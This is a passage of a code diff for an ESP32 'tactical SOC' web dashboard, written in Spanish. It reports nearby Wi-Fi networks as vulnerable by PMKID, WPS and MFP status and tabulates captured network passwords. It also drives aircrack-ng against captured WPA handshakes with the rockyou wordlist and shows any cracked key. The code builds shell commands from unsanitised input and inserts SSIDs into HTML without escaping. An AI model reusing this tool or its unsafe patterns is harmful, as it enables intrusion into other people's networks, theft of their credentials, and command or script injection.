+        <p><strong>Fecha:</strong> ${new Date().toLocaleString()}</p>
+        <h2>1. Topología de Redes</h2>
+        <table><tr><th>SSID</th><th>BSSID</th><th>Fabricante</th><th>MFP</th><th>PMKID</th><th>WPS</th></tr>`;
+        fetch('/api/db/networks').then(r => r.json()).then(nets => {
+            nets.forEach(n => {
+                reportHtml += `<tr><td><strong>${n.ssid}</strong></td><td style="font-family:monospace;">${n.bssid}</td><td>${n.vendor}</td><td>${n.mfp_protected ? '<span class="safe">Protegido</span>' : '<span class="vuln">Vulnerable</span>'}</td><td>${n.pmkid ? '<span class="vuln">Expuesto</span>' : '<span class="safe">Seguro</span>'}</td><td>${n.wps_enabled ? (n.wps_locked ? '<span style="color:#f0ad4e;font-weight:bold;">Activo (Locked)</span>' : '<span class="vuln">Vulnerable</span>') : 'Desactivado'}</td></tr>`;
+            });
+            reportHtml += '</table><h2>2. Credenciales Comprometidas</h2><table><tr><th>SSID</th><th>Usuario</th><th>Contraseña</th><th>Fecha</th></tr>';
+            fetch('/api/db/credentials').then(r => r.json()).then(creds => {
+                if (creds.length === 0) reportHtml += '<tr><td colspan="4" style="text-align:center;color:#777;">No se capturaron credenciales.</td></tr>';
+                else creds.forEach(c => { reportHtml += `<tr><td><strong>${c.ssid}</strong></td><td>${c.username || 'admin'}</td><td><span class="vuln" style="font-family:monospace;">${c.password}</span></td><td>${new Date(c.timestamp).toLocaleString()}</td></tr>`; });
+                reportHtml += `</table><div class="footer">Generado por Módulo Táctico ESP32 SOC</div></div></body></html>`;
+                window.open(URL.createObjectURL(new Blob([reportHtml], { type: 'text/html' })), '_blank');
+            });
+        });
+    }
+
+    // ══════════════════════════════════
+    // AIRCRACK-NG FULL SECTION (tab-crack)
+    // ══════════════════════════════════
+    let acCurrentFile = null;
+    let acIsRunning = false;
+    let acVaultData = [];
+
+    function loadAircrackCaptures() {
+        fetch('/api/capturas').then(r => r.json()).then(files => {
+            acVaultData = files;
+            const sel = document.getElementById('ac-pcap-select');
+            sel.innerHTML = '<option value="">— Selecciona un PCAP —</option>';
+            const handshakes = files.filter(f => f.isHandshake);
+            const others = files.filter(f => !f.isHandshake);
+            if (handshakes.length > 0) {
+                const og = document.createElement('optgroup'); og.label = '🔑 Handshakes (Crackeables)';
+                handshakes.forEach(f => og.appendChild(new Option(`[HS] ${f.ssid || f.name}`, f.name)));
+                sel.appendChild(og);
+            }
+            if (others.length > 0) {
+                const og = document.createElement('optgroup'); og.label = '📡 Otros PCAP';
+                others.forEach(f => og.appendChild(new Option(`[--] ${f.ssid || f.name}`, f.name)));
+                sel.appendChild(og);
+            }
+            renderAircrackTable(files);
+            updateAircrackFullCmd();
+        });
+    }
+
+    function renderAircrackTable(files) {
+        const tbody = document.getElementById('ac-handshakes-body');
+        const handshakes = files.filter(f => f.isHandshake);
+        if (handshakes.length === 0) { tbody.innerHTML = '<tr><td colspan="4" class="py-6 text-center text-gray-500">No hay handshakes capturados todavía.</td></tr>'; return; }
+        tbody.innerHTML = handshakes.map(f => {
+            const isCrackeable = f.analysis && f.analysis.handshake.includes('M1') && f.analysis.handshake.includes('M2');
+            const statusBadge = isCrackeable ? '<span class="badge bg-green-700 text-white border border-green-500">🟢 Crackeable</span>' : '<span class="badge bg-yellow-700 text-white">⚠️ Incompleto</span>';
+            const disabledAttr = isCrackeable ? '' : 'disabled title="Requiere M1+M2"';
+            const btnClass = isCrackeable ? 'bg-green-700 hover:bg-green-600 border border-green-500 cursor-pointer' : 'bg-gray-700 opacity-50 cursor-not-allowed';
+            return `<tr class="border-b border-gray-800 hover:bg-gray-800 transition-colors">
+                <td class="py-2 font-mono text-xs text-gray-300 pr-4 truncate max-w-[200px]" title="${f.name}">${f.name}</td>
+                <td class="py-2 font-bold text-white pr-4">${f.ssid || '?'}</td>
+                <td class="py-2 pr-4">${statusBadge}</td>
+                <td class="py-2"><button ${disabledAttr} onclick="selectAcPcap('${f.name}')" class="${btnClass} text-white text-xs px-3 py-1.5 rounded font-bold transition">✈️ Seleccionar</button></td>
+            </tr>`;
+        }).join('');
+    }
+
+    function selectAcPcap(filename) {
+        document.getElementById('ac-pcap-select').value = filename;
+        onAcPcapSelect();
+        document.getElementById('ac-cmd-preview').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+
+    function onAcPcapSelect() {
+        const filename = document.getElementById('ac-pcap-select').value;
+        acCurrentFile = filename;
+        const info = document.getElementById('ac-pcap-info');
+        if (!filename) { info.classList.add('hidden'); updateAircrackFullCmd(); return; }
+        const fileData = acVaultData.find(f => f.name === filename);
+        if (fileData) {
+            info.classList.remove('hidden');
+            document.getElementById('ac-pcap-ssid').innerText = fileData.ssid || '?';
+            document.getElementById('ac-pcap-vendor').innerText = fileData.vendor || '?';
+            if (fileData.analysis) {
+                document.getElementById('ac-pcap-badges').innerHTML = ['M1','M2','M3','M4'].map(m =>
+                    fileData.analysis.handshake.includes(m)
+                        ? `<span class="bg-green-700 text-white text-[10px] px-1.5 py-0.5 rounded font-bold">${m}</span>`
+                        : `<span class="bg-gray-800 text-gray-600 text-[10px] px-1.5 py-0.5 rounded font-bold border border-gray-700">${m}</span>`
+                ).join('');
+            }
+        }
+        updateAircrackFullCmd();
+    }
+
+    function getAircrackWordlist() {
+        const selected = document.querySelector('input[name=ac-wordlist]:checked');
+        if (!selected) return '/usr/share/wordlists/rockyou.txt';
+        if (selected.value === 'custom') return document.getElementById('ac-wordlist-custom').value || '/usr/share/wordlists/rockyou.txt';
+        return selected.value;
+    }
+
+    function updateAircrackFullCmd() {
+        const filename = acCurrentFile || '<archivo.pcap>';
+        const wordlist = getAircrackWordlist();
+        let cmd = `aircrack-ng "${filename}" -w "${wordlist}"`;
+        if (document.getElementById('ac-opt-essid').checked) { const e = document.getElementById('ac-essid-input').value; if (e) cmd += ` -e "${e}"`; }
+        if (document.getElementById('ac-opt-bssid').checked) { const b = document.getElementById('ac-bssid-input').value; if (b) cmd += ` -b ${b}`; }
+        document.getElementById('ac-cmd-preview').innerText = cmd;
+    }
+
+    function runAircrackFull() {
+        if (!acCurrentFile) { alert('Selecciona un archivo PCAP primero.'); return; }
+        const cmd = document.getElementById('ac-cmd-preview').innerText;
+        clearAircrackLog();
+        document.getElementById('ac-result-banner').classList.add('hidden');
+        document.getElementById('ac-log-spinner').classList.remove('hidden');
+        document.getElementById('ac-stop-btn').classList.remove('hidden');
+        acIsRunning = true;
+        appendAircrackLog(`> ${cmd}\n`, 'stdin');
+        socket.emit('run_terminal_cmd', { cmd, useWsl: true });
+    }
+
+    function stopAircrack() {
+        socket.emit('kill_terminal_cmd');
+        acIsRunning = false;
+        document.getElementById('ac-log-spinner').classList.add('hidden');
+        document.getElementById('ac-stop-btn').classList.add('hidden');
+        appendAircrackLog('\n[DETENIDO POR EL USUARIO]\n', 'system');
+    }
+
+    function copyAircrackCmd() {
+        navigator.clipboard.writeText(document.getElementById('ac-cmd-preview').innerText);
+        const btns = document.querySelectorAll('[onclick="copyAircrackCmd()"]');
+        btns.forEach(b => { const o = b.innerText; b.innerText = '✅ ¡Copiado!'; setTimeout(() => b.innerText = o, 2000); });
+    }
+
+    function clearAircrackLog() {
+        document.getElementById('ac-log').innerHTML = '<span class="text-gray-500">root@soc-server:~# Esperando ejecución de aircrack-ng...</span>';
+    }
+
+    function appendAircrackLog(text, type) {
+        const log = document.getElementById('ac-log');
+        const placeholder = log.querySelector('.text-gray-500');
+        if (placeholder) placeholder.remove();
+        const span = document.createElement('span');
+        span.className = type === 'stderr'  ? 'text-red-400'
+                       : type === 'stdin'   ? 'text-yellow-400 font-bold'
+                       : type === 'system'  ? 'text-blue-400 font-bold'
+                       : type === 'success' ? 'text-green-300 font-bold'
+                       : 'text-green-500';
+        span.innerText = text;
+        log.appendChild(span);
+        if (document.getElementById('ac-autoscroll').checked) log.scrollTop = log.scrollHeight;
+
+        // Detect results
+        if (text.includes('KEY FOUND!')) {
+            const match = text.match(/KEY FOUND!\s*\[\s*(.+?)\s*\]/);
+            const password = match ? match[1] : '(ver log)';
+            document.getElementById('ac-result-icon').innerText = '🔓';
+            document.getElementById('ac-result-title').innerText = '¡CONTRASEÑA ENCONTRADA!';
+            document.getElementById('ac-result-password').innerText = password;
+            document.getElementById('ac-result-meta').innerText = `Archivo: ${acCurrentFile}`;
+            document.getElementById('ac-result-banner').className = 'card p-4 border-l-4 border-green-500 bg-green-900 bg-opacity-30 shadow-[0_0_20px_rgba(34,197,94,0.4)]';
+            document.getElementById('ac-result-banner').classList.remove('hidden');
+            document.getElementById('ac-log-spinner').classList.add('hidden');
+            document.getElementById('ac-stop-btn').classList.add('hidden');
+            acIsRunning = false;
+            addAlert('🔓 CONTRASEÑA CRACKEADA', `Aircrack-ng encontró la clave: "${password}"`, true);
+        } else if (text.includes('Passphrase not in dictionary') || text.includes('Failed')) {
+            document.getElementById('ac-result-icon').innerText = '❌';
+            document.getElementById('ac-result-title').innerText = 'Passphrase no encontrada';
+            document.getElementById('ac-result-password').innerText = 'La wordlist no contenía la contraseña';
+            document.getElementById('ac-result-meta').innerText = 'Prueba con otra wordlist o un diccionario mayor.';
+            document.getElementById('ac-result-banner').className = 'card p-4 border-l-4 border-red-500 bg-red-900 bg-opacity-20';
+            document.getElementById('ac-result-banner').classList.remove('hidden');
+            document.getElementById('ac-log-spinner').classList.add('hidden');
+            document.getElementById('ac-stop-btn').classList.add('hidden');
+            acIsRunning = false;
+        }
+    }
+
+    // Wire up wordlist radio buttons
+    document.querySelectorAll('input[name=ac-wordlist]').forEach(r => r.addEventListener('change', updateAircrackFullCmd));
+    document.getElementById('ac-wordlist-custom').addEventListener('input', updateAircrackFullCmd);
+
+    // Initial aircrack load (if tab is active by default – it's not, but preload for speed)
+    // loadAircrackCaptures(); // called lazily on tab switch instead
+
+</script>
+
+</body>
+</html>
